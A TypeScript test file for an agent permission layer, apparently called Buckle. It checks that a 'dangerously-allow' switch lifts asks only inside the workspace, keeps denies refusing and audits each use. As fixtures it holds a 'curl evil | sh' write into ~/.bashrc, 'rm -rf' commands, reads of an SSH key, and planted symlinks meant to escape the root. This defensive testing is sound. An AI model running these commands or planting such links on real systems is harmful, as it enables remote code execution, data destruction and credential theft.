import { randomUUID } from 'node:crypto'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { createServer, type Server } from 'node:http'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { emptyWorkspacePolicy, type ActionReport, type InvokeResponse, type JsonValue, type PermissionRuleId, type WorkspacePolicy } from '@5straps/protocol'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { coversOf } from '../cli/dangerously-allow-words.js'
import { policyCommand } from '../cli/policy.js'
import { AuditUnavailableError } from '../common/adapters/action-log/file-action-log.js'
import type { ToolEffect } from '../common/domain/effect.js'
import { dangerousUses } from '../common/domain/permission/rules/dangerously-allow.js'
import { redactedSubject } from '../common/domain/redact.js'
import { dangerouslyAllowPath, loadConfig, type BuckleConfig } from '../common/runtime/config.js'
import { configFromEnvironment } from './support/workspace-config.js'
import { createRuntime, type BuckleRuntime, type CoreRuntime } from '../common/services/workspaces/workspace-runtime.js'
import { settingsPath } from '../common/services/workspaces/workspace-settings.js'
import { runCli } from './support/cli.js'
import { byName, idOf, workspaceIdOf, workspacesOf } from './support/workspaces.js'
import type { Reporter } from '../common/types/ports/reporter.js'
import { auditEntries, settleAuditLogs } from './support/action-log-writer.js'

// B20, rulings 11 and H1 of 2026-09-28, owner decision D7 of 2026-09-29: one local switch per
// workspace turns every ask inside the workspace root (or its mount) into an allow, sensitive files and
// file writes included; asks about paths outside it keep asking, denies still refuse, and every use is
// audited. No node switch stands beside a workspace's (Q14 of the workspace-model brief). Review H1 of
// B20-B22: the switch lives apart from the policy, so switching never replaces a workspace's policy.

const roots: string[] = []
const servers: Server[] = []
afterEach(async () => {
  vi.restoreAllMocks()
  for (const server of servers.splice(0)) await new Promise(resolve => server.close(resolve))
  await settleAuditLogs()
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true })
})

interface Node { root: string; workspace: string; outside: string; config: BuckleConfig; runtime: CoreRuntime; reports: ActionReport[] }

interface CliOutput { exitCode: number; out: string; err: string }

async function node(input: { policy?: string; environment?: Record<string, string> } = {}): Promise<Node> {
  const root = mkdtempSync(join(tmpdir(), 'buckle-dangerously-'))
  roots.push(root)
  const workspace = join(root, 'workspace')
  const outside = join(root, 'home')
  mkdirSync(join(workspace, 'private'), { recursive: true })
  mkdirSync(join(outside, '.ssh'), { recursive: true })
  mkdirSync(join(root, 'state'), { mode: 0o700 })
  writeFileSync(join(workspace, '.env'), 'FIXTURE=synthetic\n')
  writeFileSync(join(workspace, 'private', 'notes.md'), 'private notes\n')
  writeFileSync(join(outside, '.ssh', 'id_ed25519'), 'synthetic key fixture\n')
  writeFileSync(join(outside, '.bashrc'), '# fixture\n')
  // Dangling links an agent could plant (review H1 and H2 of B23-B25): out of the root, and into Buckle's state.
  symlinkSync('../home/planted.txt', join(workspace, 'escape-link.txt'))
  symlinkSync('../state/dangerously-allow.json', join(workspace, 'state-link.json'))
  const config = configFromEnvironment({
    BUCKLE_WORKSPACE_ROOT: workspace, BUCKLE_STATE_DIR: join(root, 'state'), BUCKLE_SANDBOX: 'none', BUCKLE_ALLOW_SHELL: 'true', BUCKLE_SHELL_ISOLATION: 'false',
    BUCKLE_PACKS: 'fs,shell,web', BUCKLE_APPROVAL_TIMEOUT_MS: '1', ...(input.policy ? { BUCKLE_POLICY: input.policy } : {}), ...input.environment,
  })
  const reports: ActionReport[] = []
  const reporter: Reporter = { configured: true, record: entry => { reports.push(entry) }, report: async () => {}, flush: async () => {} }
  const runtime = await createRuntime({ config, reporter })
  return { root, workspace, outside, config, runtime, reports }
}

/** The real permission pipeline; a prepared effect stands in for the tool's own, and nothing host-side runs. */
async function call(runtime: BuckleRuntime, tool: string, effects: ToolEffect[]) {
  const execute = vi.fn(async () => 'executed')
  const prepare = vi.spyOn(runtime.registry().get(tool), 'prepare').mockReturnValue({ effects, execute })
  const requestId = `dangerously-${randomUUID()}`
  const result = await runtime.invoke({ request: { requestId, approvalTokens: [], tool, args: {} }, sessionId: 'dangerously-session', approvalWait: { mode: 'none' } })
  prepare.mockRestore()
  return { result, execute, requestId }
}

/** A real tool, as an agent calls it. */
async function run(runtime: BuckleRuntime, tool: string, args: Record<string, JsonValue>): Promise<{ result: InvokeResponse; requestId: string }> {
  const requestId = `dangerously-real-${randomUUID()}`
  const result = await runtime.invoke({ request: { requestId, approvalTokens: [], tool, args }, sessionId: 'dangerously-session', approvalWait: { mode: 'none' } })
  return { result, requestId }
}

function policy(change: (value: WorkspacePolicy) => void): WorkspacePolicy {
  const value = emptyWorkspacePolicy()
  change(value)
  return value
}

async function uses(runtime: BuckleRuntime, requestId: string) {
  return (await auditEntries(runtime.actions, 200)).filter(entry => entry.tool === 'policy_dangerously_allowed' && entry.requestId === requestId)
}

async function runtimeUses(runtime: BuckleRuntime) {
  return (await auditEntries(runtime.actions, 200)).filter(entry => entry.tool === 'policy_dangerously_allowed')
}

function asked(result: InvokeResponse): string[] {
  return result.outcome === 'approval_required' ? result.approvals.map(approval => approval.rule) : []
}

/** Every ask kind the permission engine raises, from the tool that raises it (plan section C; H1), inside the workspace or naming no path. */
function covered(node: Node): Array<{ kind: string; tool: string; effects: ToolEffect[]; rule: PermissionRuleId }> {
  const { workspace } = node
  return [
    { kind: 'a destructive command', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'rm', args: ['-rf', 'build'] }], rule: 'destructive_command' },
    { kind: 'the working-directory write of a shell command', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'ls', args: [] }, { kind: 'write_path', path: workspace }], rule: 'write_scope' },
    { kind: 'the working-directory write of a script', tool: 'script_run', effects: [{ kind: 'exec', command: 'node', args: ['script.mjs'] }, { kind: 'write_path', path: workspace }], rule: 'write_scope' },
    { kind: 'a read the filesystem policy asks about', tool: 'fs_read', effects: [{ kind: 'read_path', path: join(workspace, 'private', 'notes.md') }], rule: 'filesystem_policy' },
    { kind: 'a sensitive file', tool: 'fs_read', effects: [{ kind: 'read_path', path: join(workspace, '.env') }], rule: 'sensitive_path' },
    { kind: 'fs_write', tool: 'fs_write', effects: [{ kind: 'write_path', path: join(workspace, 'note.md') }], rule: 'write_scope' },
    { kind: 'fs_patch', tool: 'fs_patch', effects: [{ kind: 'write_path', path: join(workspace, 'note.md') }], rule: 'write_scope' },
    { kind: 'a batch write', tool: 'fs_write_batch', effects: [{ kind: 'write_path', path: join(workspace, 'a.md') }, { kind: 'write_path', path: join(workspace, 'b', 'c.md') }], rule: 'write_scope' },
    { kind: 'a private network address', tool: 'web_fetch', effects: [{ kind: 'network', url: 'http://127.0.0.1:9/probe' }], rule: 'network_egress' },
    // lsp_discover's effect; the dev pack needs a host language-server setup this test does not have.
    { kind: 'a process listing', tool: 'fs_list', effects: [{ kind: 'process_probe' }], rule: 'process_probe' },
  ]
}

/** Asks about paths outside the workspace root: the switch leaves them asking (owner decision D7). */
function uncovered(node: Node): Array<{ kind: string; tool: string; effects: ToolEffect[]; rule: PermissionRuleId }> {
  const { workspace, outside } = node
  return [
    { kind: 'a read outside the workspace', tool: 'fs_read', effects: [{ kind: 'read_path', path: join(outside, 'notes.md') }], rule: 'read_scope' },
    { kind: 'a batch write half outside', tool: 'fs_write_batch', effects: [{ kind: 'write_path', path: join(workspace, 'a.md') }, { kind: 'write_path', path: join(outside, 'b.md') }], rule: 'write_scope' },
    { kind: 'a shell whose working directory is outside', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'ls', args: [] }, { kind: 'write_path', path: outside }], rule: 'write_scope' },
    { kind: 'a write through a dangling link out of the root', tool: 'fs_write', effects: [{ kind: 'write_path', path: join(workspace, 'escape-link.txt') }], rule: 'write_scope' },
  ]
}

const privateAsks = policy(value => { value.filesystem = { rules: [{ path: 'private', read: 'ask' }] } })

describe('the dangerously-allow switch over every ask kind (coverage table)', () => {
  it('asks for each kind while off, allows each inside the workspace while on, audited per use, and keeps asking outside it', async () => {
    const setup = await node()
    const { runtime } = setup
    await runtime.policy.apply(privateAsks)
    for (const row of [...covered(setup), ...uncovered(setup)]) {
      const off = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, outcome: off.result.outcome }).toEqual({ kind: row.kind, outcome: 'approval_required' })
      expect(asked(off.result)).toContain(row.rule)
      expect(off.execute).not.toHaveBeenCalled()
    }

    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    await policyCommand(runtime, ['dangerously-allow', 'on'], { ignoreWarning: false })
    for (const row of covered(setup)) {
      const on = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, outcome: on.result.outcome }).toEqual({ kind: row.kind, outcome: 'ok' })
      expect(on.execute).toHaveBeenCalledOnce()
      expect((await uses(runtime, on.requestId)).map(entry => entry.detail)).toContain(row.rule)
      const result = (await auditEntries(runtime.actions, 200)).find(entry => entry.event === 'result' && entry.requestId === on.requestId && entry.tool === row.tool)
      expect(result?.approvedBy).toContain('dangerously_allow')
    }
    for (const row of uncovered(setup)) {
      const on = await call(runtime, row.tool, row.effects)
      expect({ kind: row.kind, outcome: on.result.outcome }).toEqual({ kind: row.kind, outcome: 'approval_required' })
      // Only the asks outside the workspace remain: the ones inside are the switch's.
      expect(asked(on.result)).toEqual([row.rule])
      expect(on.execute).not.toHaveBeenCalled()
      expect(await uses(runtime, on.requestId)).toEqual([])
    }
  })
})

describe('the switch through the real tools (review L9 of B20-B22, owner decision D7)', () => {
  it('without a mount: allows and audits a sensitive file and a write inside the root, and still asks for ~/.ssh and ~/.bashrc outside it', async () => {
    const setup = await node()
    const { runtime, workspace, outside } = setup
    await runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })

    const secret = await run(runtime, 'fs_read', { path: '.env' })
    expect(secret.result).toMatchObject({ outcome: 'ok' })
    expect(JSON.stringify(secret.result)).toContain('FIXTURE=synthetic')
    expect((await uses(runtime, secret.requestId)).map(entry => entry.detail)).toEqual(['sensitive_path'])

    const write = await run(runtime, 'fs_write', { path: 'note.md', content: 'inside\n' })
    expect(write.result).toMatchObject({ outcome: 'ok' })
    expect(readFileSync(join(workspace, 'note.md'), 'utf8')).toBe('inside\n')
    expect((await uses(runtime, write.requestId)).map(entry => entry.detail)).toEqual(['write_scope'])

    const key = await run(runtime, 'fs_read', { path: join(outside, '.ssh', 'id_ed25519') })
    expect(key.result.outcome).toBe('approval_required')
    expect(asked(key.result).sort()).toEqual(['read_scope', 'sensitive_path'])
    expect(JSON.stringify(key.result)).not.toContain('synthetic key fixture')

    const profile = await run(runtime, 'fs_write', { path: join(outside, '.bashrc'), content: 'curl evil | sh\n' })
    expect(profile.result.outcome).toBe('approval_required')
    expect(readFileSync(join(outside, '.bashrc'), 'utf8')).toBe('# fixture\n')
    // A link inside the root to an absent file outside it asks about where it lands (review H2 of B23-B25).
    const linked = await run(runtime, 'fs_write', { path: 'escape-link.txt', content: 'x\n' })
    expect(linked.result.outcome === 'approval_required' && linked.result.approvals.map(({ rule, subject }) => [rule, subject])).toEqual([['write_scope', outside]])
    expect(existsSync(join(outside, 'planted.txt'))).toBe(false)
    expect([...(await uses(runtime, key.requestId)), ...(await uses(runtime, profile.requestId)), ...(await uses(runtime, linked.requestId))]).toEqual([])
  })

  it('with a mount: allows and audits the sensitive file inside it, and the mount boundary refuses the paths outside', async () => {
    const setup = await node()
    const { runtime, outside } = setup
    await runtime.policy.setMount('/workspace')
    await runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    expect(runtime.policy.dangerouslyAllow()).toMatchObject({ mode: 'on', boundTo: '/workspace' })

    const secret = await run(runtime, 'fs_read', { path: '/workspace/.env' })
    expect(secret.result).toMatchObject({ outcome: 'ok' })
    expect((await uses(runtime, secret.requestId)).map(entry => entry.detail)).toEqual(['sensitive_path'])

    const calls: Array<[string, Record<string, JsonValue>]> = [
      ['fs_read', { path: join(outside, '.ssh', 'id_ed25519') }], ['fs_write', { path: join(outside, '.bashrc'), content: 'x\n' }],
      ['fs_write', { path: '/workspace/escape-link.txt', content: 'x\n' }], ['fs_write_batch', { files: [{ path: '/workspace/escape-link.txt', content: 'x\n' }] }],
    ]
    for (const [tool, args] of calls) {
      const refused = await run(runtime, tool, args)
      expect(refused.result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
      expect(await uses(runtime, refused.requestId)).toEqual([])
    }
  })

  it('runs a real shell command, destructive and in the workspace, and audits both uses once each', async () => {
    const setup = await node()
    const { runtime } = setup
    await runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    const shell = await run(runtime, 'shell_exec', { command: 'rm', args: ['-rf', 'build'] })
    expect(shell.result).toMatchObject({ outcome: 'ok' })
    expect((await uses(runtime, shell.requestId)).map(entry => entry.detail).sort()).toEqual(['destructive_command', 'write_scope'])
  })

  it('reaches a loopback server with web_fetch, audits the hop before it is made, and refuses the hop when the audit cannot be written (review M3 of B20-B22)', async () => {
    const setup = await node()
    const { runtime, root } = setup
    let hits = 0
    const server = createServer((_, response) => { hits++; response.end('loopback fixture') })
    servers.push(server)
    await new Promise<void>(resolve => server.listen(0, '127.0.0.1', resolve))
    const url = `http://127.0.0.1:${(server.address() as { port: number }).port}/probe`

    const off = await run(runtime, 'web_fetch', { url })
    expect(off.result.outcome).toBe('approval_required')
    await runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    const on = await run(runtime, 'web_fetch', { url })
    expect(on.result).toMatchObject({ outcome: 'ok', output: { status: 200, body: 'loopback fixture' } })
    expect(hits).toBe(1)
    expect((await uses(runtime, on.requestId)).map(entry => entry.detail)).toEqual(['network_egress'])

    // The use entry is required: a log that will not take it refuses the hop, and nothing is fetched.
    const record = runtime.actions.record.bind(runtime.actions)
    vi.spyOn(runtime.actions, 'record').mockImplementation(async (entry) => {
      if (entry.tool === 'policy_dangerously_allowed') throw new AuditUnavailableError()
      return record(entry)
    })
    await expect(run(runtime, 'web_fetch', { url })).rejects.toBeInstanceOf(AuditUnavailableError)
    expect(hits).toBe(1)
    expect(existsSync(join(root, 'state'))).toBe(true)
  })
})

describe('what the switch never turns (policy.md: a matched deny stays denied)', () => {
  it.each([
    ['an owner command deny rule', 'shell_exec', (setup: Node): ToolEffect[] => [{ kind: 'exec', command: 'rm', args: ['-rf', 'build'] }], policy(value => { value.commands.deny = ['rm *'] })],
    ['a filesystem deny rule', 'fs_read', (setup: Node): ToolEffect[] => [{ kind: 'read_path', path: join(setup.workspace, 'private', 'notes.md') }], policy(value => { value.filesystem = { rules: [{ path: 'private', read: 'deny' }] } })],
    ['the tool policy', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }], policy(value => { value.tools = { deny: ['fs_write'] } })],
    ['the mount boundary', 'fs_read', (setup: Node): ToolEffect[] => [{ kind: 'read_path', path: join(setup.outside, 'notes.md') }], policy(value => { value.mount = '/workspace' })],
    ['Buckle\'s own state', 'fs_read', (setup: Node): ToolEffect[] => [{ kind: 'read_path', path: join(setup.root, 'state', 'policy.json') }], emptyWorkspacePolicy()],
    ['the mount boundary through a dangling link', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'escape-link.txt') }], policy(value => { value.mount = '/workspace' })],
    ['Buckle\'s own state through a dangling link', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'state-link.json') }], emptyWorkspacePolicy()],
    ['Buckle\'s own state through a dangling link under a mount', 'fs_write', (setup: Node): ToolEffect[] => [{ kind: 'write_path', path: join(setup.workspace, 'state-link.json') }], policy(value => { value.mount = '/workspace' })],
  ])('keeps %s refusing', async (_, tool, effects, stored) => {
    const setup = await node()
    await setup.runtime.policy.apply(stored)
    // Where the folder shows is the mount table's, set by the owner's CLI alone.
    if (stored.mount) await setup.runtime.policy.setMount(stored.mount)
    await setup.runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    const { result, execute } = await call(setup.runtime, tool, effects(setup))
    expect(result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
    expect(execute).not.toHaveBeenCalled()
    expect(await runtimeUses(setup.runtime)).toEqual([])
  })
})

describe('a workspace\'s switch, with no node switch beside it', () => {
  it('takes effect on its own', async () => {
    const setup = await node()
    await setup.runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    expect(setup.runtime.policy.dangerouslyAllow()).toEqual({ mode: 'on', boundTo: setup.workspace, setByEarlierBuild: false })
    const { result } = await call(setup.runtime, 'fs_write', [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }])
    expect(result.outcome).toBe('ok')
  })
})

describe('a registered workspace keeps its policy through the switch (review H1 of B20-B22)', () => {
  const REGISTERED = policy((value) => {
    value.commands.deny = ['rm *', 'curl *']
    value.tools = { deny: ['fs_write'] }
    value.filesystem = { rules: [{ path: 'private', read: 'deny' }] }
    value.network.allow = ['example.com']
  })

  /** The node and its manager over one state directory, as a start of the node opens them. */
  async function start(root: string) {
    const config = configFromEnvironment({ BUCKLE_WORKSPACE_ROOT: join(root, 'default'), BUCKLE_STATE_DIR: join(root, 'state'), BUCKLE_SANDBOX: 'none', BUCKLE_ALLOW_SHELL: 'true', BUCKLE_SHELL_ISOLATION: 'false', BUCKLE_PACKS: 'fs,shell,web', BUCKLE_APPROVAL_TIMEOUT_MS: '1' })
    const manager = await workspacesOf(config)
    const runtime = (await byName(manager, 'default')).runtime
    return { config, runtime, manager }
  }

  async function stop(started: Awaited<ReturnType<typeof start>>): Promise<void> {
    for (const runtime of await started.manager.opened()) {
      await runtime.workbenches.close()
      await runtime.history.close()
    }
  }

  async function childRefuses(started: Awaited<ReturnType<typeof start>>): Promise<void> {
    const { runtime: child } = await byName(started.manager, 'child')
    expect(child.policy.effective()).toMatchObject({ commands: { deny: ['rm *', 'curl *'] }, tools: { deny: ['fs_write'] }, network: { allow: ['example.com'] }, filesystem: { rules: [{ path: 'private', read: 'deny' }] }, mount: '/workspace' })
    expect(Object.keys(child.policy.effective())).not.toContain('dangerouslyAllow')
    // A registered workspace runs no shell without bubblewrap, so its command denies are checked in the effective policy above.
    expect((await run(child, 'fs_read', { path: '/workspace/private/notes.md' })).result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
    expect((await run(child, 'fs_write', { path: '/workspace/note.md', content: 'x' })).result).toMatchObject({ outcome: 'error', error: { code: 'PERMISSION_DENIED' } })
  }

  it('on, restart, off, restart: the denies still refuse and the network list stays', async () => {
    const root = mkdtempSync(join(tmpdir(), 'buckle-dangerously-child-'))
    roots.push(root)
    for (const directory of ['default', join('child', 'private')]) mkdirSync(join(root, directory), { recursive: true })
    writeFileSync(join(root, 'child', 'private', 'notes.md'), 'private\n')
    let started = await start(root)
    await started.manager.create({ id: 'child', name: 'Child', dir: join(root, 'child'), policy: REGISTERED })
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const settings = settingsPath(started.config.nodeStateDirectory!, idOf(started.manager, 'child'))
    const before = readFileSync(settings, 'utf8')

    await policyCommand((await byName(started.manager, 'child')).runtime, ['dangerously-allow', 'on'], { ignoreWarning: false })
    const childState = (await byName(started.manager, 'child')).config
    // The switch writes its own file, keyed by the workspace's id, and never the settings the child's policy is read from.
    expect(readFileSync(settings, 'utf8')).toBe(before)
    expect(JSON.parse(readFileSync(dangerouslyAllowPath(childState), 'utf8'))).toMatchObject({ version: 2, workspaces: { [idOf(started.manager, 'child')]: { mode: 'on' } } })
    await stop(started)

    started = await start(root)
    expect((await byName(started.manager, 'child')).runtime.policy.dangerouslyAllow()).toMatchObject({ mode: 'on' })
    await childRefuses(started)

    await policyCommand((await byName(started.manager, 'child')).runtime, ['dangerously-allow', 'off'], { ignoreWarning: false })
    await stop(started)
    started = await start(root)
    expect((await byName(started.manager, 'child')).runtime.policy.dangerouslyAllow().mode).toBe('off')
    await childRefuses(started)
    await stop(started)
  })
})

// Finding 42 of the Phase 1 review: the switch named by --workspace or --dir through the CLI dispatch, from another
// workspace's folder, lands under the named workspace; only its own tests ran the switch on a resolved runtime.
describe('buckle policy dangerously-allow --workspace and --dir', () => {
  it('land the switch and its audit record under the named workspace, never under the folder the command runs in', async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'buckle-dangerously-target-')))
    roots.push(root)
    for (const folder of ['default', 'child']) mkdirSync(join(root, folder))
    const environment = { BUCKLE_WORKSPACE_ROOT: join(root, 'default'), BUCKLE_STATE_DIR: join(root, 'state'), BUCKLE_SANDBOX: 'none', BUCKLE_APPROVAL_TIMEOUT_MS: '1' }
    const manager = await workspacesOf(configFromEnvironment(environment))
    await manager.create({ id: 'child', name: 'Child', dir: join(root, 'child') })
    await manager.close()
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const config = loadConfig(environment)
    // Every workspace keeps its records under its own id (D85, Q15); the id a folder derives is the registry's.
    const idsOf = { default: workspaceIdOf(join(root, 'default')), child: workspaceIdOf(join(root, 'child')) }
    const stateOf = (name: 'default' | 'child') => join(root, 'state', 'workspaces', idsOf[name])
    const readJson = (file: string) => (existsSync(file) ? JSON.parse(readFileSync(file, 'utf8')) as { workspaces: Record<string, { mode: string }> } : { workspaces: {} })
    const switchOf = (name: 'default' | 'child') => readJson(dangerouslyAllowPath({ stateDirectory: stateOf(name) })).workspaces
    const changes = (name: 'default' | 'child') => {
      const file = join(stateOf(name), 'actions.jsonl')
      if (!existsSync(file)) return []
      // The switch's own record, as written once it changed; the attempt record before it is not counted.
      return readFileSync(file, 'utf8').split('\n').filter(Boolean).map(line => JSON.parse(line) as { tool: string; event: string; workspaceId: string; detail?: string }).filter(entry => entry.tool === 'policy_dangerously_allow_changed' && entry.event === 'result')
    }
    const inDefault = (argv: string[]) => runCli({ argv: ['policy', 'dangerously-allow', ...argv], config, confirm: null, cwd: join(root, 'default') })

    expect((await inDefault(['on', '--workspace', 'child'])).exitCode).toBe(0)
    expect(switchOf('child')).toMatchObject({ [idsOf.child]: { mode: 'on' } })
    expect(switchOf('default')).toEqual({})
    expect(changes('child')).toMatchObject([{ workspaceId: idsOf.child, workspaceName: 'Child', detail: 'on' }])
    expect(changes('default')).toEqual([])

    expect((await inDefault(['off', '--dir', join(root, 'child')])).exitCode).toBe(0)
    // Off removes the workspace's entry from its own switch file.
    expect(switchOf('child')).toEqual({})
    expect(switchOf('default')).toEqual({})
    expect(changes('child')).toMatchObject([{ workspaceId: idsOf.child, detail: 'on' }, { workspaceId: idsOf.child, detail: 'off' }])
    expect(changes('default')).toEqual([])
  })
})

describe('the audit of every use and every change', () => {
  it('records each use with its rule and redacted subject, reports it to Rings, and warns in the owner\'s log', async () => {
    const setup = await node()
    const { runtime, reports } = setup
    await runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    const { requestId } = await call(runtime, 'shell_exec', [{ kind: 'exec', command: 'rm', args: ['-rf', 'build', '--token=zq81-synthetic-secret'] }, { kind: 'write_path', path: setup.workspace }])

    const entries = await uses(runtime, requestId)
    expect(entries.map(entry => entry.detail).sort()).toEqual(['destructive_command', 'write_scope'])
    const destructive = entries.find(entry => entry.detail === 'destructive_command')
    expect(destructive?.args).toEqual({ tool: 'shell_exec', rule: 'destructive_command', subject: expect.stringMatching(/^rm \[\d+ characters\]$/), mode: 'on' })
    expect(JSON.stringify(await auditEntries(runtime.actions, 200))).not.toContain('zq81')
    const reported = reports.filter(report => report.tool === 'policy_dangerously_allowed')
    expect(reported.map(report => report.rule).sort()).toEqual(['destructive_command', 'write_scope'])
    expect(JSON.stringify(reports)).not.toContain('zq81')
  })

  it('writes one entry per rule and subject a call meets, however often it meets them (review L12 of B20-B22)', async () => {
    const setup = await node()
    const { runtime, workspace } = setup
    await runtime.policy.apply(policy(value => { value.filesystem = { rules: [{ path: 'private', read: 'ask' }] } }))
    for (const index of [1, 2, 3]) writeFileSync(join(workspace, 'private', `more-${index}.md`), 'x\n')
    await runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    const walked = await run(runtime, 'fs_read_batch', { paths: ['private/notes.md', 'private/notes.md', 'private/more-1.md'] })
    expect(walked.result.outcome).toBe('ok')
    const subjects = (await uses(runtime, walked.requestId)).map(entry => (entry.args as { subject: string }).subject)
    expect(subjects).toEqual([...new Set(subjects)])
    expect(subjects.length).toBe(2)
  })

  it('records the switch itself, on and off, and applies off at once without a restart', async () => {
    const setup = await node()
    const { runtime } = setup
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    await policyCommand(runtime, ['dangerously-allow', 'on'], { ignoreWarning: false })
    expect((await call(runtime, 'fs_write', [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }])).result.outcome).toBe('ok')
    await policyCommand(runtime, ['dangerously-allow', 'off'], { ignoreWarning: false })
    expect((await call(runtime, 'fs_write', [{ kind: 'write_path', path: join(setup.workspace, 'note.md') }])).result.outcome).toBe('approval_required')
    const changes = (await auditEntries(runtime.actions, 200)).filter(entry => entry.tool === 'policy_dangerously_allow_changed' && entry.event === 'result')
    expect(changes.map(entry => entry.detail)).toEqual(['on', 'off'])
  })

  it('shows the switch and its boundary in buckle policy show, and says what it covers when switched on (owner decision D7)', async () => {
    const setup = await node()
    let printed = ''
    vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => { printed += String(chunk); return true })
    await policyCommand(setup.runtime, ['dangerously-allow', 'on'], { ignoreWarning: false })
    expect(printed).toContain('WARNING: dangerously allow is now on')
    expect(printed).toContain(`bound to the workspace root, or its mount when one is set (${setup.workspace})`)
    expect(printed).toContain(coversOf('on'))
    expect(printed).not.toContain('mount boundary still refuse')
    printed = ''
    await policyCommand(setup.runtime, ['show'], { ignoreWarning: false })
    // The same sentence in show (review L15 of B23-B25).
    expect(printed).toContain('Dangerously allow  ON, bound to the workspace root, or its mount when one is set')
    expect(printed).toContain(coversOf('on'))
    expect(printed).not.toContain('every ask there')
    printed = ''
    await policyCommand(setup.runtime, ['show', '--json'], { ignoreWarning: false })
    const shown = JSON.parse(printed) as { dangerouslyAllow: unknown; effective: Record<string, unknown> }
    expect(shown.dangerouslyAllow).toEqual({ mode: 'on', boundTo: setup.workspace, setByEarlierBuild: false })
    expect(Object.keys(shown.effective)).not.toContain('dangerouslyAllow')
  })
})

describe('only the switch changes the switch (ruling H1e)', () => {
  it('keeps the switch through other policy writes and a clear, which never touch it', async () => {
    const setup = await node()
    const { runtime } = setup
    await runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    await runtime.policy.apply(policy(value => { value.network.allow = ['example.com'] }))
    expect(runtime.policy.dangerouslyAllow().mode).toBe('on')
    expect(Object.keys(runtime.policy.stored())).not.toContain('dangerouslyAllow')
    await runtime.policy.clear()
    expect(runtime.policy.stored().network.allow).toEqual([])
    expect(runtime.policy.dangerouslyAllow().mode).toBe('on')
  })

  it('refuses a policy file that names the switch from buckle policy import, exit 2 as the setup face answers 409', async () => {
    const setup = await node()
    let written = ''
    vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => { written += String(chunk); return true })
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const file = join(setup.root, 'policy.json')
    for (const flags of [{ commands: true, fileReads: true }, { commands: false, fileReads: false }]) {
      writeFileSync(file, JSON.stringify({ ...emptyWorkspacePolicy(), network: { allow: ['example.com'] }, dangerouslyAllow: flags }))
      expect((await policyCommand(setup.runtime, ['import', file], { ignoreWarning: false })).exitCode).toBe(2)
    }
    expect(written).toContain('The dangerously-allow switch is not part of a workspace policy')
    expect(setup.runtime.policy.stored().network.allow).toEqual([])
    expect(setup.runtime.policy.dangerouslyAllow().mode).toBe('off')
    writeFileSync(file, JSON.stringify({ ...emptyWorkspacePolicy(), network: { allow: ['example.com'] } }))
    expect((await policyCommand(setup.runtime, ['import', file], { ignoreWarning: false })).exitCode).toBe(0)
  })

  it('refuses usage other than on, safe, or off', async () => {
    const setup = await node()
    vi.spyOn(process.stderr, 'write').mockImplementation(() => true)
    expect((await policyCommand(setup.runtime, ['dangerously-allow'], { ignoreWarning: false })).exitCode).toBe(1)
    expect((await policyCommand(setup.runtime, ['dangerously-allow', 'yes'], { ignoreWarning: false })).exitCode).toBe(1)
    expect(setup.runtime.policy.dangerouslyAllow().mode).toBe('off')
  })

  it('reads an unreadable switch file as off', async () => {
    const setup = await node()
    await setup.runtime.policy.setDangerouslyAllow('on', { ignoreWarning: false })
    writeFileSync(dangerouslyAllowPath(setup.config), '{ not json')
    expect(setup.runtime.policy.dangerouslyAllow().mode).toBe('off')
    chmodSync(dangerouslyAllowPath(setup.config), 0o600)
  })
})

// The switch's three modes: `off`, `on` (every ask it covers, floor asks and a secret reference's file included), and
// `safe`, which lifts every ask but floor asks, an unknown interpreter's code, and a secret reference's file. `true` and
// `false` read as on and off; the levels of an earlier build are refused, and a switch file an earlier build wrote reads as off.
describe('the switch\'s modes', () => {
  const DECOY = 'decoy-value-0123456789'
  const SECRET = { command: 'curl', args: ['-H', 'Authorization: Bearer {{file:.env.local:API_TOKEN}}'] }
  const LISTED = policy(value => { value.commands.destructive = ['terraform destroy *'] })

  /** The asks `safe` leaves to a person: the floor (sudo, the destructive list, and the file floor), and an unknown interpreter's code. */
  function floorAsks(setup: Node): Array<{ kind: string; tool: string; effects: ToolEffect[]; rule: PermissionRuleId }> {
    return [
      { kind: 'a sudo command', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'sudo', args: ['ls'] }], rule: 'destructive_command' },
      { kind: 'a destructive-list command', tool: 'shell_exec', effects: [{ kind: 'exec', command: 'terraform', args: ['destroy', 'prod'] }], rule: 'destructive_command' },
      { kind: 'a file floor delete', tool: 'fs_delete', effects: [{ kind: 'delete_path', path: join(setup.workspace, 'doomed.txt'), floor: true }], rule: 'write_scope' },
